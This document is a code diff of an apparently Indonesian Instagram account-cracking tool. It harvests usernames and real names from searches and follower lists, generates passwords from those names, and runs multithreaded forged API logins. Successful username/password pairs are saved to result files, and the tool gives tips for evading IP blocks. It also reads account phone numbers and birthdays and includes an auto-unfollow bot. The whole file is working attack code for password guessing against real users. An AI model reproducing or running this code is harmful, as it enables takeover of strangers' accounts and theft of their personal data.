-			pn=x_jason['logged_in_user']['phone_number']
+			#id=x_jason['logged_in_user']['pk']
+			#nm=x_jason['logged_in_user']['full_name']
+			#pn=x_jason['logged_in_user']['phone_number']
 			return {'status':'success','cookie':kuki,'userame':self.username}
 		elif 'challenge_required' in x.text:
 			return {'status':'checkpoint'}
@@ -445,18 +468,13 @@ class instagramAPI:
 			return {'status':'login_error'}
 C = ''
 
-ip = requests.get("https://api.ipify.org").text
-ng = requests.get("http://ip-api.com/json/").json()["country"]
-try:sh = requests.get('https://httpbin.org/ip').json()
-except:sh = {'origin':'-'}
-_gep = requests.get('http://ipinfo.io/json').json()
-
 class instagram:
 	def __init__(self,external,username,cookie):
 		self.ext=external
 		self.username=username
 		self.cookie=cookie
 		self.s=requests.Session()
+		self.tol = Console()
 	def logo(self):
 		for i in external:
 			try:
@@ -465,44 +483,95 @@ class instagram:
 				following=i.split('|')[2]
 			except:
 				pass
-			banner()
-			prints(Panel(f"{H2}{ng}",title=f"{P2}negara",width=80,padding=(0,33),style=f"{color_table}"))
-			axz.append(Panel(f"""{P2}username  : {H2}{self.username}\n{P2}followers : {H2}{followers}\n{P2}following :{H2} {following}\n{P2}Ip address:{H2} {ip}""",title=f"{P2}data akun",width=38,style=f"{color_table}"))
-			axz.append(Panel(f"""{P2}Info kuota : {H2}{_gep['org']}\n{P2}Zona waktu : {H2}{_gep['timezone']}\n{P2}Kota       : {H2}{_gep['city']}\n{P2}Tanggal    : {H2}{day}""",title=f"{P2}info pengguna",width=39,style=f"{color_table}"))
-			console.print(Columns(axz))
-			prints(Panel(f" {H2}{waktu()}",title=f"{P2}waktu",width=80,padding=(0,30),style=f"{color_table}"))
-			prints(Panel(f"{P2}[{color_rich}01{P2}]. crack dari pencarian nama        {P2}[{color_rich}06{P2}]. lihat akun hasil crack\n{P2}[{color_rich}02{P2}]. crack dari pengikut              {P2}[{color_rich}07{P2}]. bot auto unfollow\n{P2}[{color_rich}03{P2}]. crack dari mengikuti             {P2}[{color_rich}08{P2}]. Crack fb ( {H2}new crack{P2} )\n{P2}[{color_rich}04{P2}]. crack ulang hasil cp             {P2}[{color_rich}09{P2}]. Hapus lisensi  {H2}{P2} \n{P2}[{color_rich}05{P2}]. Bot spam target                  {P2}[{color_rich}00{P2}]. keluar ( {M2}hapus cookie{P2} )",width=80,padding=(0,4),style=f"{color_table}"))
-			prints(Panel(f"{P2}jika ingin mengubah warna tema ketik {color_rich}'ubah' {P2}untuk mengubah warna tema",width=80,padding=(0,3),style=f"{color_table}"))
+			Banner___Gua__Ngab()
+			self.mentod()
+			prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=80,padding=(0,30),style=f"#FFFFFF"))
+			prints(Panel(f"""
+{P2}[{R2}01{P2}]. crack id dari pencarian nama   {P2}[{R2}05{P2}]. cek hasil crack
+{P2}[{R2}02{P2}]. crack id dari pengikut         {P2}[{R2}06{P2}]. bot auto unfollow
+{P2}[{R2}03{P2}]. crack id dari mengikuti        {P2}[{R2}07{P2}]. remove lisensi
+{P2}[{R2}04{P2}]. crack ulang hasil cp           {P2}[{R2}00{P2}]. keluar ({M2} hapus cookie {P2})""",title=f"{M2}• {K2}• {H2}•{P2} MENU {H2}• {K2}• {M2}•",width=80,padding=(0,4),style=f"#FFFFFF"))
 
-	def hapus_lisensi(self):
-		ask = input(f" apakah anda yakin ingin menghapus lisensi? Y/t : ")
-		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}succeed menghapus {color_rich}'lisensi'{P2} terima kasih telah menggunakan script BrayennnXD",width=80,style=f"{color_table}"));time.sleep(2);exit()
-		elif ask in ["t","T"]:self.menu()
-		else:self.hapus_lisensi()
+	def mentod(self):
+	       	for i in external:
+	       		nama=i.split('|')[0]
+	       		followers=i.split('|')[1]
+	       		following=i.split('|')[2]
+	       	try:
+	       	       ses=requests.Session()
+	       	       lisen=open('data/lisensi.txt','r').read()
+	       	       met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzMjA4OTAxMyIsInRqSVB5U1dJQkFVdU1yMmFGVGk5eW5ZbnpuOWlmS3FHVjVMdG1Yb1EiXQ==&ProductId=17890&Key='+lisen).json()
+	       	       men = met['licenseKey']
+	       	       key = men['key'][0:11]
+	       	       tahun = men['expires'][0:4]
+	       	       buln = men['expires'][5:7]
+	       	       tanggal = men['expires'][8:10]
+	       	       bulan=bulan_ttl[buln]
+	       	       tahun1 = men['created'][0:4]
+	       	       buln1 = men['created'][5:7]
+	       	       tanggal1 = men['created'][8:10]
+	       	       bulan1=bulan_ttl[buln1]
+	       	except:
+	       	       key = "-"
+	       	       tanggal = "-"
+	       	       bulan = "-"
+	       	       tahun = "-"
+	       	       tanggal1 = "-"
+	       	       bulan1 = "-"
+	       	       tahun1 = "-"
+	       	pornhub = []
+	        pornhub.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}\n{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",title=f"{M2}• {K2}• {H2}•{P2} DATA AKUN {H2}• {K2}• {M2}•",width=39,padding=(0,2),style=f"#FFFFFF"))
+	        pornhub.append(Panel(f"{P2}lisensi : {H2}{key}-****-****\n{P2}join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}\n{P2}premium : {H2}Ya",title=f"{M2}• {K2}• {H2}•{P2} DATA LISENSI {H2}• {K2}• {M2}•",width=39,padding=(0,2),style=f"#FFFFFF"))
+	        self.tol.print(Columns(pornhub))
 
+	def HapusLisen(self):
+	    try:
+	        xc = input(f"{P}[{B}?{P}] apakah anda yakin ingin menghapus lisensi? : {H}")
+	        if xc in ["y","Y"]:
+	           os.remove("data/lisensi.txt")
+	           jalan(f"{P}[{H}✓{P}] berhasil menghapus lisensi")
+	           exit()
+	        elif xc in ["t","T"]:
+	            jalan(f"{P}[{B}+{P}] kembali ke menu utama")
+	            time.sleep(2)
+	            self.menu()
+	        else:
+	            self.Exit()
+	    except:pass
+	
 	def Exit(self):
-		x=input(f" apakah anda yakin ingin keluar? Y/t : ")
-		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}succeed menghapus {color_rich}'cookie' {P2}terima kasih telah menggunakan script BrayennnXD",width=80,padding=(0,2),style=f"{color_table}"));time.sleep(2);exit()
-		elif x in ["t","T"]:self.menu()
-		else:self.Exit()
+		try:
+		    prints(Panel(f"{R2}{open('data/cookie.txt','r').read()}",title=f"{M2}• {K2}• {H2}•{P2} COOKIE ANDA {H2}• {K2}• {M2}•",padding=(0,2),style=f"#FFFFFF"))
+		    xd = input(f'{P}[{B}?{P}] apakah anda yakin ingin keluar? : {H}')
+		    if xd in ["y","Y"]:
+		       RemoveCookie()
+		       jalan(f"{P}[{H}✓{P}] berhasil menghapus cookie")
+		       exit()
+		    elif xd in ["t","T"]:
+		        jalan(f"{P}[{B}+{P}] kembali ke menu utama")
+		        time.sleep(2)
+		        self.menu()
+		    else:
+		         self.Exit()
+		except:pass
 
 	def sixAPI(self,six_id):
-		url = "https://z-p42.www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
+		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
 		x = requests.get(url)
 		x_jason = x.json()
 		uid = str( x_jason['users'][0].get("user").get("pk") )
 		return uid
 
 	def unfollowAPI(self,user_id,username_id,cookie):
-		uuid=self.generateUUID(True)
-		xx=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":User_Agent()}).content
+		uuid=generateUUID(True)
+		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
 		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
 		s.headers.update({'Connection': 'close',
                        'Accept': '*/*',
                        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Cookie2': '$Version=1',
                        'Accept-Language': 'en-US',
-                       'User-Agent': User_Agent()})
+                       'User-Agent': USN})
 
 		data = json.dumps({'_uuid': uuid,
                            '_uid': username_id,
@@ -512,50 +581,55 @@ class instagram:
 		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
 			self.generateUUID(False),
 			urllib.request.quote(data))
-		return s.post('https://z-p42.www.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
+		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
 
 
 	def searchAPI(self,cookie,nama):
 		try:
-			x=s.get('https://z-p42.www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
-			x_jason=json.loads(x.text)
-			for i in x_jason['users']:
-				user=i['user']
-				username=user['username']
-				fullname=user['full_name']
-				internal.append(f'{username}|{fullname}')
-		except requests.exceptions.ConnectionError:
-			prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+			for ba in range(100):
+				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
+				x_jason=json.loads(x.text)
+				try:
+					for i in x_jason['users']:
+						user=i['user']
+						username=user['username']
+						fullname=user['full_name']
+						internal.append(f'{username}|{fullname}')
+					wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+					sys.stdout.write(f"\r{P}[{B}*{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...")
+					sys.stdout.flush()
+					time.sleep(0.0002)
+				except:
+					if 'challenge' in x.text:
+						break
+					else:
+						continue
+			print("\r")
+		except Exception as e:print(e)
 		return internal
-
+	
+	def ua_ig(self):
+	    rr = random.randint
+	    return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; Redmi Note {str(rr(7,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)")
+	
 	def idAPI(self,cookie,id):
 		if 'sukses' in lisensiku:
 			try:
-				m=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
+				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
 				m_jason=m.json()["data"]["user"]
 				idx=m_jason["id"]
 			except requests.exceptions.ConnectionError:
-				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+				print(f'{P}[{M}!{P}] koneksi internet anda bermasalah');exit()
+			except requests.exceptions.ConnectionError:
+			    print(f'{P}[{M}!{P}] koneksi internet anda bermasalah')
+			    time.sleep(0.3)
+			    exit()
 			except Exception as e:
-				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
+				print(f'{P}[{M}!{P}] username tidak tersedia')
+				exit()
 			return idx
 		else:lisensi()
-   
-   	
-	def ingfo(self,cookie):
-		try:
-			link = s.get(f"https://z-p42.www.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":user_agentAPI()},cookies={"cookie":cookie}).json()["form_data"]
-			nomor = link["phone_number"].replace("-", "").replace(" ", "")
-			tggl = link["birthday"]
-			year, month, day = tggl.split("-")
-			month = bulan_ttl[month]
-			tanggal = (f"{day} {month} {year}")
-		except:
-			nomor = "-"
-			tanggal = "-"
-		return nomor, tanggal
-
-	
+    	
 	def infoAPI(self,cookie,api,id):
 		if 'sukses' in  lisensiku:
 			try:
@@ -569,7 +643,7 @@ class instagram:
 				if 'pengikut' in menudump:
 					maxid=x_jason['next_max_id']
 					for z in range (9999):
-						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
+						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
 						x_jason=json.loads(x.text)
 						try:
 							for i in x_jason['users']:
@@ -577,6 +651,10 @@ class instagram:
 								nama = i["full_name"]
 								internal.append(f'{username}|{nama}')
 								following.append(username)
+							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+							sys.stdout.write(f"\r{P}[{B}*{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...{P}")
+							sys.stdout.flush()
+							time.sleep(0.0002)
 							try:
 								maxid=x_jason['next_max_id']
 							except:
@@ -586,11 +664,9 @@ class instagram:
 								break
 							else:
 								continue
-				else:pass
-			except requests.exceptions.ConnectionError:
-				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+				print("\r")
 			except Exception as e:
-				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
+				print(f'{P}[{M}!{P}] username tidak tersedia')
 			return internal
 		else:lisensi()
 		
@@ -607,7 +683,7 @@ class instagram:
 				if 'mengikuti' in menudump:
 					maxid=x_jason['next_max_id']
 					for z in range (9999):
-						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
+						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
 						x_jason=json.loads(x.text)
 						try:
 							for i in x_jason['users']:
@@ -615,6 +691,10 @@ class instagram:
 								nama = i["full_name"]
 								internal.append(f'{username}|{nama}')
 								following.append(username)
+							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
+							sys.stdout.write(f"\r{P}[{B}*{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...")
+							sys.stdout.flush()
+							time.sleep(0.0002)
 							try:
 								maxid=x_jason['next_max_id']
 							except:
@@ -624,326 +704,586 @@ class instagram:
 								break
 							else:
 								continue
-				else:pass
-			except requests.exceptions.ConnectionError:
-				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+				print("\r")
 			except Exception as e:
-				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
+				print(f'{P}[{M}!{P}] username tidak tersedia')
 			return internal
-		else:lisensi()		
+		else:lisensi()
+
+	def ingfoocu(self, cookie):
+		with requests.Session() as ses:
+		     try:
+		         link = ses.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
+		         nomor = link["phone_number"].replace("-", "").replace(" ", "")
+		         tggl = link["birthday"]
+		         year, month, day = tggl.split("-")
+		         month = bulan_ttl[month]
+		         tanggal = (f"{day} {month} {year}")
+		     except:
+		         nomor = "-"
+		         tanggal = "-"
+		     return nomor, tanggal
 	
-	def useragent(self):
-		self.satu = random.randrange(73, 99)
-		self.dua = random.randrange(4200, 4900)
-		self.tiga = random.randrange(40, 150)
-		useragent = f'''Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 {self.satu}.0.{self.dua}.{self.tiga} Mobile Safari/537.36 MQQBrowser/6.6''' 
-		return useragent
+	def AdityaCreate(self, cookie):
+		with requests.Session() as ses:
+		     try:
+		         b = ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":cookie})
+		         soup = parser(b.text,'html.parser')
+		         body = soup.find("body")
+		         script = body.find("script", text=lambda t: t.startswith("window._sharedData"))
+		         script_json = script.string.split(" = ", 1)[1].rstrip(";")
+		         script_json = json.loads(script_json)
+		         i = script_json["entry_data"]['SettingsPages']
+		         regax = re.findall('\d+',str(i))
+		         tahun = datetime.fromtimestamp(int(regax[0])).strftime('%d %B %Y')
+		     except:
+		         tahun = "-"
+		     return tahun
+	
+	def ingfo(self):
+		urut = []
+		prints(Panel(f"{P2}[ {H2}hasil crack akan di simpan di dalam folder results {P2}]",width=80,padding=(0,11),style=f"#FFFFFF"))
+		urut.append(Panel(f"{P2}result {H2}OK-{day}.txt",width=39,padding=(0,5),style=f"#FFFFFF"))
+		urut.append(Panel(f"{P2}result {K2}CP-{day}.txt[/]",width=39,padding=(0,5),style=f"#FFFFFF"))
+		self.tol.print(Columns(urut))
+		prints(Panel(f"{H2}craking sedang di mulai, ketik ctrl+z di keyboard anda untuk berhenti\n\n{N2}    hidupkan mode pesawat 5 detik jika terdeteksi adanya spam ip",width=80,padding=(0,3),style=f"#FFFFFF"))
+
+	def methodku(self):
+		urut = []
+		urut.append(Panel(f"API {H2}recommended{P2}",title=f"{R2}01{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
+		urut.append(Panel(f"AJAX {H2}very slow{P2}",title=f"{R2}02{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
+		urut.append(Panel(f"API V2 {H2}fast",title=f"{R2}03{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
+		self.tol.print(Columns(urut))
 
 	def passwordAPI(self,xnx):
-		prints(Panel(f"{P2}total username terkumpul : {color_rich}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
-		prints(Panel(f"{P2}[{color_rich}1{P2}]. name,name123,name1234\n{P2}[{color_rich}2{P2}]. name,name123,name1234,name12345\n{P2}[{color_rich}3{P2}]. name,name123,name1234,name12345,name123456\n{P2}[{color_rich}4{P2}]. password manual",width=80,padding=(0,14),style=f"{color_table}"))
-		c=input(f' input 1 sampai 4 : ')
-		if c=='1':
+		os.popen('play-audio data/sound/message.mp3')
+		prints(Panel(f"{P2}total username terkumpul : {R2}{len(internal)}",width=80,padding=(0,20),style=f"#FFFFFF"))
+		self.methodku()
+		u = input(f'{P}[{B}?{P}] pilih method : {H}')
+		if u in [""]:
+		    method.append('satu')
+		elif u in ["1","01"]:
+		    method.append('satu')
+		elif u in ["2","02"]:
+		    method.append('dua')
+		elif u in ["3","03"]:
+		    method.append('tiga')
+		else:
+			method.append('satu')
+		prints(Panel(f"{P2}[{R2}01{P2}]. nama, nama123, nama1234\n{P2}[{R2}02{P2}]. nama, nama123, nama1234, nama12345\n{P2}[{R2}03{P2}]. nama, nama123, nama1234, nama12345, nama123456\n{P2}[{R2}04{P2}]. nama, nama123, nama1234, manual",title=f"{M2}• {K2}• {H2}•{P2} PASSWORD {H2}• {K2}• {M2}•",width=80,padding=(0,4),style=f"#FFFFFF"))
+		c=input(f'{P}[{B}?{P}] pilih password : {H}')
+		if c in ["1","01"]:
 			self.generateAPI(xnx,c)
-		elif c=='2':
+		elif c in ["2","02"]:
 			self.generateAPI(xnx,c)
-		elif c=='3':
+		elif c in ["3","03"]:
 			self.generateAPI(xnx,c)
-		elif c=='4':
-			prints(Panel(f"{P2}masukan password manual minimal password 6 karakter jangan sampe kurang\ncontoh password : sayang,sayang123,indonesia,rahasia,xyaa123",width=80,style=f"{color_table}"))
-			zx=input(f' masukan password : ')
+		elif c in ["4","04"]:
+			prints(Panel(f"{P2}gunakan tanda koma ({R2},{P2}) untuk pemisahan contoh sayang, sayang123, kontol",width=80,padding=(0,3),style=f"#FFFFFF"))
+			zx=input(f'{P}[{B}?{P}] masukan password : {H}')
 			self.generateAPI(xnx,c,zx)
 		else:
 			self.passwordAPI(xnx)
 
 	def generateAPI(self,user,o,zx=''):
-		global prog,des
-		xxkontol.append(Panel(f"""   {H2}OK {P2}: {P2}result/{day}.txt""",width=38,style=f"{color_table}"))
-		xxkontol.append(Panel(f"""   {K2}CP {P2}: {P2}result/{day}.txt""",width=39,style=f"{color_table}"))
-		console.print(Columns(xxkontol))
-		prints(Panel(f"{P2}crack di mulai tekan {color_rich}'Ctrl+Z'{P2} di keyboard anda jika ingin berhenti\n\n        {P2}hidupkan mode pesawat 5 detik jika terdeteksi spam ip",width=80,padding=(0,4),style=f"{color_table}"))
-		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
-		des = prog.add_task('',total=len(internal))
-		with prog:
-			with ThreadPoolExecutor(max_workers=15) as shinkai:
-				for i in user:
-					try:
-						username=i.split("|")[0]
-						password=i.split("|")[1].lower()
-						for w in password.split(" "):
-							if len(w)<3:
-								continue
+		self.ingfo()
+		with ThreadPoolExecutor(max_workers=15) as adtyaxc:
+			for i in user:
+				try:
+					username=i.split("|")[0]
+					password=i.split("|")[1].lower()
+					for w in password.split(" "):
+						if len(w)<3:
+							continue
+						else:
+							w=w.lower()
+							if o=="1":
+								if len(w)==3 or len(w)==4 or len(w)==5:
+									sandi=[w,w+'123',w+'1234']
+								else:
+									sandi=[w,w+'123',w+'1234']
+							elif o=="2":
+								if len(w)==3 or len(w)==4 or len(w)==5:
+									sandi=[w,w+'123',w+'1234',password.lower()]
+								else:
+									sandi=[w+'123',w,w+'1234',password.lower()]
+							elif o=="3":
+								if len(w)==3 or len(w)==4 or len(w)==5:
+									sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
+								else:
+									sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
+							elif o=="4":
+								if len(w)==3 or len(w)==4 or len(w)==5:
+									sandi = zx.replace(" ", "").split(",")
+								else:
+									sandi = zx.replace(" ", "").split(",")
+							if 'satu' in method:
+								adtyaxc.submit(self.crackAPI,username,sandi)			
+							elif 'dua' in method:
+								adtyaxc.submit(self.crackAJAX,username,sandi)
+							elif 'tiga' in method:
+							    adtyaxc.submit(self.crackAPIversi2,username,sandi)
 							else:
-								w=w.lower()
-								if o=="1":
-									if len(w)==3 or len(w)==4 or len(w)==5:
-										sandi=[w,w+'123',w+'1234']
-									else:
-										sandi=[w,w+'123',w+'1234']
-								elif o=="2":
-									if len(w)==3 or len(w)==4 or len(w)==5:
-										sandi=[w,w+'123',w+'1234',w+'12345']
-									else:
-										sandi=[w,w+'123',w+'1234',w+'12345', password.lower()]
-								elif o=="3":
-									if len(w)==3 or len(w)==4 or len(w)==5:
-										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
-									else:
-										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
-								elif o=="4":
-									if len(zx) > 3:
-										sandi = zx.replace(" ", "").split(",")
-									else:
-										break
-								shinkai.submit(self.crackAPI,username,sandi)
-					except:pass
-		prints(Panel(f" {P2}crack {color_rich}{len(internal)} {P2}username selesai Hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"));time.sleep(4);exit()
+								adtyaxc.submit(self.crackAPI,username,sandi)
+				except:
+					pass
+		print('\n')
+		os.popen('play-audio data/sound/message.mp3')
+		prints(Panel(f" {P2}VINDRA-XD {R2}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"#FFFFFF"))
+		exit()
 
 	def APIinfo(self,user):
 		try:
-			x=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":user_agentAPI(),"x-ig-app-id":'936619743392459'})
+			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
 			x_jason=x.json()["data"]["user"]
 			nama=x_jason["full_name"]
 			pengikut=x_jason["edge_followed_by"]["count"]
 			mengikut=x_jason["edge_follow"]["count"]
 			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
 		except:
-			pass
-
+			nama = "-"
+			pengikut = "-"
+			mengikut = "-"
+			postingan = "-"
 		return nama,pengikut,mengikut,postingan
-
+	
 	def crackAPI(self,user,pas):
 		global loop,success,checkpoint
-		ses=requests.Session()
-		ua = random.choice(oppo)
-		prog.update(des,description=f"{H2}stabil{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
-		prog.advance(des)
+		ses = requests.Session()
+		logtemp=0
+		guid = str(uuid.uuid4())
+		ponid = str(uuid.uuid4())
+		andro = "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
+		ig_sig = HARIS["ig_sig"]
+		verig = HARIS["IGV"]
+		igver = verig.split(",")
+		igv = random.choice(igver)
+		gedz = HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
+		ven1 = gedz.split('|')[1]
+		ven2 = gedz.split('|')[2]
+		giu1 = HARIS["giu"]
+		giu = giu1.split("||")
+		ua = f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
+		dat = HARIS["sinkz"]
+		dat.update({"id": guid})
+		data1 = json.dumps(dat)
+		ned = hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
+		data2 = HARIS["sinkz1"]
+		data2.update({'signed_body': f'{ned}.{str(data1)}'})
+		head = HARIS["headaing"]
+		head.update({"user-agent": ua})
+		while True:
+				try:
+					p = ses.post(HARIS["sinkz2"],headers=head,data=data2)
+					break
+				except:pass
+		sys.stdout.write(f'\r{P}[{H}#{P}] crack {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
+		for pw in pas:
+				try:
+					data = json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
+					ned = hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
+					head2 = HARIS["headaing1"]
+					head2.update({"user-agent": ua})
+					pasw = pw.replace(' ','+')
+					sianjing = HARIS["sianjing"]
+					setan = sianjing.split("||")
+					dataa = f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
+					respon = ses.post(HARIS["crack"],headers=head2,data=dataa)
+					try:
+						xyaaXD = json.loads(respon.text)
+					except:
+						xyaaXD = (respon.text)
+					logtemp+=1
+					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
+						success.append(user)
+						try:
+							nama,pengikut,mengikut,postingan=self.APIinfo(user)
+							print("\r                                       ")
+							adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {user_agentAPI()}'
+							pepekXD = nel(adit, style='green')
+							print('\n')
+							cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API[white]'))
+							open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
+							break
+						except:
+							print("\r                                       ")
+							adit=f'\rNama      : null\nUsername  : null\nPassword  : null\nPengikut  : null\nMengikuti : null\nPostingan : null\nUser-Agent: {user_agentAPI()}'
+							pepekXD = nel(adit, style='green')
+							print('\n')
+							cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API[white]'))
+							open(f"result/success-{day}.txt","a").write(f'null|null\n')
+							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
+							break
+					elif 'https://i.instagram.com/challenge' in str(respon.text):
+						nama,pengikut,mengikut,postingan=self.APIinfo(user)
+						print("\r                                       ")
+						adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
+						pepekXD = nel(adit, style='yellow')
+						print('\n')
+						cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method API[white]'))
+						open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+						checkpoint.append(user)
+						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
+						break
+					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
+						sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
+						time.sleep(1)
+						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
